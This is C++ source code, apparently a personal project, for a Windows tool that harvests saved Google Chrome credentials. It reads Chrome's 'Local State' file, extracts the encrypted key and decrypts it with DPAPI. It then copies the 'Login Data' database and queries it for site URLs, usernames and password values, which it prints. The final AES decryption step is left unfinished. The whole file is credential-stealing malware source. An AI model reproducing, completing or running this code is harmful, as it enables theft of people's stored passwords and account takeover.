
#include "sqlite3.h"
#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#include <string>
#include <vector>
#include <iostream>



std::vector<BYTE> b64Decode(std::string strInput){
    // as before you should make two calls to ::CryptStringToBinaryA 
    char * toDecrypt = new char[strInput.length() + 1];
    if (strcpy(toDecrypt, strInput.c_str()) == NULL){
        printf("strcopy failed: \n");
        printf("Last error: %d\n", GetLastError());
    }
    
    
    DWORD bytes;
    
    if (!CryptStringToBinaryA( toDecrypt , strInput.length() ,CRYPT_STRING_BASE64, NULL,& bytes,NULL,NULL )){
        printf("1st call failed \n");
        printf("Last error: %d\n", GetLastError());
    }   
    BYTE * retBuff = (BYTE *)malloc(bytes * sizeof(char*));
    if (!CryptStringToBinaryA(toDecrypt , strInput.length() ,CRYPT_STRING_BASE64, retBuff ,&bytes,NULL,NULL)){
        printf("2nd call failed \n");
        printf("Last error: %d\n", GetLastError());
    }
    printf("retbuff\n");
    printf("BYTES: %d\n", bytes);
    std::vector<BYTE> ByteVector(retBuff, retBuff + bytes );
    return ByteVector;
}

char * readFile(char * fileName){
        DWORD fileSize;
        char* buffer;
        fflush(stdin);
        FILE * infile = fopen(fileName, "r");
        if (infile == NULL){
        printf("file failed to open");
        printf("ERROR: %d", GetLastError());
    }
    long size;
    fseek(infile, 0L, SEEK_END);
    size = ftell(infile);
    fseek(infile, 0L, SEEK_SET);
    printf("SIZE inside readFile: %d\n", size);
    buffer = (char *)malloc(size);
    char character;
    int i = 0;
    
    while((character=fgetc(infile))!=EOF){
        buffer[i] = character;
        //printf("%c",buffer[i]);
        i++;

    }
    return buffer;
}

 std::vector<byte> GetLocalState(){
    printf("IN LOCAL STATE \n");
    HANDLE hToken =  GetCurrentProcessToken();
    DWORD lpcchSize = 30;
    LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
    if (!GetUserProfileDirectoryA(hToken, lpProfileDir,&lpcchSize  )){
        printf("didnt get path\n");
        //return std::vector<byte> (""); //change that
    }
    std::string db_path = std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\Local State");
    std::cout << db_path << '\n';
    //then fetch and load json
    char * b = readFile( const_cast<char*>(db_path.c_str()));
    //printf("Bytes read: %d\n",LocalBytes.size());
    //std::cout << LocalBytes;
    //local bytes is wrong somehow
    std::string LocalBytes = std::string(b);
    int loc = LocalBytes.find("encrypted_key") + 16; //+ 16; //15 is length of
    std::string key = "";
    for (int i = 0; i < 400; i++){ //assume key is max 300 buytes kong
       
        if (b[loc + i] == '"'){
            printf("break :%d\n", i);
            break;
        }
        key += LocalBytes[i + loc];
    }
    //printf("KEY before decoding: ");
    //std::cout << key << '\n';

    std::vector<byte> Key = b64Decode(key);
    std::cout << "KEY after Decoding: ";

    return Key;

}

BYTE * GetEncryptionKey(){
    //cant rlly test yet
    printf("IN get encrpyt key \n");
    std::vector<byte> temp_key = GetLocalState();
    BYTE * Key = temp_key.data() + 5;
    //omit first 5 chars 
    printf("FIRST 5 chars: \n");
    for (int i = 0; i < 5; i++){
        putchar(temp_key[i]);
    }
    printf("\nITS DPAPI\n");
    //omg it actually works:((( im going to cry
    PDATA_BLOB blob = (PDATA_BLOB) malloc(sizeof(DATA_BLOB));
    blob->cbData = temp_key.size()- 5;
    blob->pbData = Key;
    PDATA_BLOB Ret_Blob = (PDATA_BLOB) malloc(sizeof(DATA_BLOB));
    
    if (!CryptUnprotectData(blob, NULL, NULL, NULL, NULL, 0, Ret_Blob)){
        printf("OOF DIDNT WORK\n");
        printf("ERROR: %d\n", GetLastError());
    }

    return Ret_Blob->pbData;
}

BYTE * decrypt_password();
//need aem functionality desparately plus file i/o stuff asap
static int callback(void *data, int argc, char **argv, char **azColName){
   int i;
   printf("in callback\n");
   
   for(i = 0; i<argc; i++){
      printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
   }
   
   printf("\n");
   return 0;
}



int main(){
    printf("I dump passwords!\n");
    HANDLE hToken =  GetCurrentProcessToken();
    DWORD lpcchSize = 30;
    LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
    if (!GetUserProfileDirectoryA(hToken, lpProfileDir,&lpcchSize  )){
        printf("didnt get path\n");
        return -1;
    }
    //char * a = "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data";
    
    //https://stackoverflow.com/questions/6858524/convert-char-to-lpwstr
    std::string s = (std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data"));
    //std::cout << "S: "<< s << '\n';
    const char * db_path = s.c_str();
    //size_t wn = mbsrtowcs(NULL, &t, 0, NULL);
    //wchar_t * buf = new wchar_t[wn + 1]();;
    //wn = mbsrtowcs(buf, &t, wn + 1, NULL);
    //LPCWSTR db_path = buf;
    //free(buf);
    //printf("%s\n", const_cast<char*>(db_path.c_str()));
    //copy the file contents to a new file
    //printf("DB_PATH: %S", db_path);
    
    //delete[] buf;
    const char * temp = "ChromeData.db";
    //this is still a bit buggy bc of encoding issus :(
    //CopyFiles(const_cast<char*>(temp.c_str()), const_cast<char*>(db_path.c_str())); 
   //C:\Users\Wyatt2\AppData\Local\Google\Chrome\User Data\Default"
   //create a db connection
   //BYTE *key = GetEncryptionKey(); //omg

   if (!CopyFile(db_path,temp, false)){
    printf("COPY FILE W FAILED \n");
    printf("Error: %d\n", GetLastError());
   }

   sqlite3 *db;
   char *zErrMsg = 0;
   int rc;
    //https://www.tutorialspoint.com/sqlite/sqlite_c_cpp.htm
   rc = sqlite3_open(temp, &db);

   if( rc ) {
      fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
      return(0);
   } else {
      fprintf(stderr, "Opened database successfully\n");
   }
    const char * sql = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created";
   const char* data = "Callback function called";
   rc = sqlite3_exec(db, sql, callback, (void*)data, &zErrMsg);
   if( rc != SQLITE_OK ) {
      fprintf(stderr, "SQL error: %s\n", zErrMsg);
      sqlite3_free(zErrMsg);
   } else {
      fprintf(stdout, "Operation done successfully\n");
   }
   sqlite3_close(db);
    
}
